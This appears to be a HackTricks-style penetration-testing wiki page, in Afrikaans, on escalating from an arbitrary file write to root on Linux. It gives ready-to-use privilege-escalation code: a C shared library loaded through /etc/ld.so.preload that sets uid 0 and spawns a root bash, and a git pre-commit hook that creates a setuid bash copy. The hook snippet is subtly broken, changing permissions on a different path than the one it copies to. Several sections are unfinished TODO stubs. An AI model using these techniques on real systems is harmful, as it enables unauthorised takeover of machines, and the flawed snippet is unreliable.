# Arbitraire Lêer Skryf na Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Hierdie lêer gedra soos die **`LD_PRELOAD`** omgewing veranderlike, maar dit werk ook in **SUID-binaries**.\
As jy dit kan skep of wysig, kan jy eenvoudig 'n **pad na 'n biblioteek wat met elke uitgevoerde binêre gelaai sal word** byvoeg.

Byvoorbeeld: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) is **scripts** wat op verskeie **events** in 'n git-repo uitgevoer word, soos wanneer 'n commit geskep word, 'n merge... So as 'n **privileged script of gebruiker** hierdie aksies gereeld uitvoer en dit moontlik is om in die `.git` gids te **skryf**, kan dit gebruik word om **privesc** te verkry.

Byvoorbeeld, dit is moontlik om 'n **script** in 'n git repo in **`.git/hooks`** te **genereer** sodat dit altyd uitgevoer word wanneer 'n nuwe commit geskep word:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

Die lêer geleë in `/proc/sys/fs/binfmt_misc` dui aan watter binêre uitvoering watter tipe lêers moet uitvoer. TODO: kyk na die vereistes om dit te misbruik om 'n rev shell uit te voer wanneer 'n algemene lêertipe oop is.

{{#include ../../banners/hacktricks-training.md}}
